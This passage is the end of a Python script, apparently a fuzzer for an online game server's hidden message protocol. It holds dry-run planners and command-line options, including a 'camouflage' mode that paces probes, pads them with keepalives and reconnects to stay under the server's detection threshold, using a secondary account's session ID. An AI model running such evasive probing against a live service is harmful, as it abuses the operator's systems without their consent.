        logger.warning("camouflage stopped at --max-reconns=%d (queue not exhausted)",
                       args.max_reconns)
    return 0 if not abort_flag["abort"] else 3


def plan_calibrate(out_path: Path):
    """Dry-run: describe the calibration plan WITHOUT opening a socket."""
    plan = {
        "mode": "calibrate", "dry_run": True,
        "max_live_frames": CALIBRATE_MAX_FRAMES,
        "unknown_mt": CALIBRATE_UNKNOWN_MT, "unknown_sub": CALIBRATE_UNKNOWN_SUB,
        "phases": [
            {"phase": "Q1-baseline", "desc": "20 keepalives, 1s apart, expect stable"},
            {"phase": "Q3-consecutive", "desc": "<=12 consecutive unknowns, find FIN threshold"},
            {"phase": "Q2Q4-alternate", "desc": "(K keepalive + 1 unknown) x10, test counter reset"},
        ],
        "note": "no network IO in dry-run; pass --live to actually measure",
    }
    with out_path.open("w", encoding="utf-8") as fp:
        fp.write(json.dumps(plan, ensure_ascii=False) + "\n")
    logger.warning("=== DRY-RUN calibrate plan === %s", plan)


def plan_camouflage(args, msg_types: list[int], sub_types: list[int], out_path: Path):
    """Dry-run: estimate reconnect count + duration WITHOUT opening a socket."""
    n_unknowns = len(msg_types) * len(sub_types)
    upc = max(1, args.unknown_per_conn)
    reconns_needed = (n_unknowns + upc - 1) // upc
    # per-conn wall-clock estimate:
    #   handshake ~1s + per unknown (keepalive_every * 1s + 1.5s window) + cooldown
    per_unknown = args.keepalive_every * 1.0 + 1.5
    per_conn = 1.0 + upc * per_unknown + args.reconn_cooldown
    est_secs = reconns_needed * per_conn
    plan = {
        "mode": "camouflage", "dry_run": True,
        "n_unknowns": n_unknowns, "unknown_per_conn": upc,
        "keepalive_every": args.keepalive_every,
        "reconn_cooldown": args.reconn_cooldown, "max_reconns": args.max_reconns,
        "reconns_needed": reconns_needed,
        "capped_by_max_reconns": reconns_needed > args.max_reconns,
        "est_seconds": round(est_secs, 1),
        "est_hours": round(est_secs / 3600.0, 2),
        "note": "no network IO in dry-run; pass --live to actually scan",
    }
    with out_path.open("w", encoding="utf-8") as fp:
        fp.write(json.dumps(plan, ensure_ascii=False) + "\n")
    logger.warning("=== DRY-RUN camouflage plan === %s", plan)



def main():
    p = argparse.ArgumentParser(description="N6 hidden protocol fuzzer (DRY-RUN by default)")
    p.add_argument("--target", choices=["lobby", "game"], default="lobby")
    p.add_argument("--host", default=None)
    p.add_argument("--port", type=int, default=None)
    p.add_argument("--sessionid", default="DRY_RUN_DUMMY_SID",
                   help="副号 sessionid (32-hex). dry-run mode tolerates dummy.")
    p.add_argument("--userid", default="DRY_RUN_USER",
                   help="numid string for handshake")
    p.add_argument("--roomid", type=int, default=12238,
                   help="reference roomid (used when body template needs it)")
    p.add_argument("--appid", type=int, default=0,
                   help="frame `extra` field (gameappid). PoC v5 used 0 successfully.")
    p.add_argument("--range", default="1-5000",
                   help="msg_type range, e.g. '1-5000' or '1000-3000,4000-5000'")
    p.add_argument("--skip-known", default=str(Path(__file__).with_name("xyid_closed_set.json")),
                   help="JSON of known XY_IDs to skip")
    p.add_argument("--sub-types", default="100,84,1,1006,92,0",
                   help="comma-separated sub_type (processid) values; "
                        "default 6 sub_types {0,1,84,92,100,1006} per fuzz-strategy.md §4 "
                        "and go-live checklist Gate 3")
    p.add_argument("--body-variants", action="store_true",
                   help="iterate 4 body templates per (msg, sub) combo")
    p.add_argument("--rate", type=float, default=5.0,
                   help="frames per second (LIVE only); ≤10 strongly recommended")
    p.add_argument("--out", default="fuzz_log.jsonl",
                   help="output JSONL log path")
    p.add_argument("--project-root", default=None,
                   help="path containing `remote/` package (LIVE mode)")
    p.add_argument("--live", action="store_true",
                   help="ACTUALLY send packets. Requires interactive confirmation.")
    # ---- mode selectors (mutually exclusive in spirit; default = legacy scan) ----
    p.add_argument("--calibrate", action="store_true",
                   help="CALIBRATION mode: measure server tolerance (Q1-Q4); "
                        "<= 50 live frames; no scan. Dry-run prints the plan.")
    p.add_argument("--camouflage", action="store_true",
                   help="CAMOUFLAGE scan mode: wall-aware reconnecting scan. "
                        "Dry-run prints reconnect/time estimate.")
    # ---- camouflage parameters (also used by --calibrate Q2/Q4 keepalive pad) ----
    p.add_argument("--unknown-per-conn", type=int, default=3,
                   help="max unknown frames per connection before reconnect "
                        "(camouflage). Default 3 (conservative vs attempt-2 wall ~6).")
    p.add_argument("--keepalive-every", type=int, default=2,
                   help="known keepalive frames sent before each unknown "
                        "(camouflage camouflage padding / calibrate Q2/Q4). Default 2.")
    p.add_argument("--reconn-cooldown", type=float, default=3.0,
                   help="seconds to sleep between camouflage reconnects. Default 3.")
    p.add_argument("--max-reconns", type=int, default=50,
                   help="upper bound on camouflage reconnect count. Default 50.")
    args = p.parse_args()

    # range expansion + skip
    all_targets = set(expand_range(args.range))
    skip = load_skip_set(Path(args.skip_known))
    msg_types = sorted(all_targets - skip)
    sub_types = expand_csv_ints(args.sub_types)
    out_path = Path(args.out).resolve()

    logger.info("target=%s host=%s port=%s", args.target, args.host, args.port)
    logger.info("msg_type total=%d after-skip=%d sub_types=%s body_variants=%s",
                len(all_targets), len(msg_types), sub_types, args.body_variants)
    logger.info("output=%s", out_path)

    if args.calibrate and args.camouflage:
        logger.error("--calibrate and --camouflage are mutually exclusive")
        return 4

    # ---- DRY-RUN (default; never opens a socket) ----
    if not args.live:
        if args.calibrate:
            logger.warning("=== DRY-RUN CALIBRATE === (use --live to measure)")
            plan_calibrate(out_path)
        elif args.camouflage:
            logger.warning("=== DRY-RUN CAMOUFLAGE === (use --live to scan)")
            plan_camouflage(args, msg_types, sub_types, out_path)
        else:
            logger.warning("=== DRY-RUN MODE === (use --live to actually send)")
            run_dry_run(args, msg_types, sub_types, out_path)
        return 0

    # ---- LIVE MODE — require interactive confirmation ----
    if args.sessionid == "DRY_RUN_DUMMY_SID":
        logger.error("LIVE mode requires real --sessionid (副号 32-hex)")
        return 4
    if not confirm_live():
        logger.error("LIVE mode aborted (user did not confirm)")
        return 4

    if args.calibrate:
        return run_calibrate(args, out_path, skip)
    if args.camouflage:
        return run_camouflage(args, msg_types, sub_types, out_path, skip)
    return run_live(args, msg_types, sub_types, out_path, skip)


if __name__ == "__main__":
    sys.exit(main())
